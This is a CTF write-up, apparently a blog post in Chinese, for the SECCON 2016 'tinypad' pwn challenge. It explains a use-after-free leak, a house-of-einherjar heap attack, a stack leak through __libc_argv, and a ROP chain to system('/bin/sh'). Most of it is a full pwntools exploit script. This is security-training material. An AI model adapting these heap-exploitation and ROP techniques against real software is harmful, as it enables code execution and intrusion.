---
title: seccon 2016 tinypad
categories:
  - pwn
tags: house-of-einherjar
published: true
---

# Introduction

知识点：

[house_of_einherjar](https://github.com/shellphish/how2heap/blob/master/house_of_force.c)

**[tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf)**

tinypad: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1333a912c440e714599a86192a918178f187d378, not stripped

{% highlight bash %}

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

{% endhighlight %}

这题稍微有点不一样，got 表和 tls_dtor_list 都不能写，和只能写目标地址上字符串长度的数据。

# Exploit

利用程序的 uaf 获取堆地址和 libc 基址，分配 smallbin 大小的 chunk，释放掉其中两个。

```python
add("A"*0x90)
add("B"*0x90)
add("C"*0x90)
add("D"*0xf0)
delete(3)
delete(1)
```

使用 house of einherjar 技术控制 tinypad 变量，从而实现任意地址读写，看 writeup 学到泄露 `__libc_argv` 变量从
而泄露栈地址，然后构造 rop 调用 system("/bin/sh")。

[exp](https://github.com/0x3f97/pwn/blob/master/seccon-2016-tinypad/exp.py):

```python
#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./tinypad"

system_off = 0x45390
bin_sh_off = 0x18cd57
libc_argv_off = 0x3c92f8
pop_rdi_ret = 0x4013d3
pop_rsp_3pop_ret = 0x4013cd

p = process(elf)

def add(s):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(len(s)))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(s)

def delete(idx):
    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(idx))

def edit(idx, s):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(idx))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(s)
    p.recvuntil("Is it OK?\n")
    p.recvuntil("(Y/n)>>> ")
    p.sendline("Y")


add("A"*0x90)
add("B"*0x90)
add("C"*0x90)
add("D"*0xf0)
delete(3)
delete(1)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
heap_base = u64(p.recv(4).strip().ljust(8, "\x00"))-0x140
p.recvuntil(" #   INDEX: 3\n")
p.recvuntil(" # CONTENT: ")
libc_base = u64(p.recv(6).strip().ljust(8, "\x00"))-0x3c4b78
log.info("heap_base: "+hex(heap_base))
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off
libc_argv_addr = libc_base+libc_argv_off

offsize = (heap_base+0x1e0)-0x6020a0

payload = p8(0)*0x68
payload += p64(offsize, sign=True)
payload += p64(0x6020a0)*4
edit(2, payload)

payload = p8(0)*0x90
payload += p64(offsize, sign=True)
add(payload)

delete(4)

payload = p8(0)*0x90
payload += p64(8)+p64(libc_argv_addr)
payload += p64(8)+p64(0x602148)
add(payload)

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
stack_addr = u64(p.recv(6).strip().ljust(8, "\x00"))-0xe0
log.info("stack_addr: "+hex(stack_addr))

# rop chain
edit(2, p64(stack_addr))
edit(1, p64(pop_rdi_ret))
edit(2, p64(stack_addr+0x4))
edit(1, p64(0))
edit(2, p64(stack_addr+0x5))
edit(1, p64(0))
edit(2, p64(stack_addr+0x8))
edit(1, p64(bin_sh_addr))
edit(2, p64(stack_addr+0x10))
edit(1, p64(system_addr))

p.sendline("Q")

p.interactive()
```
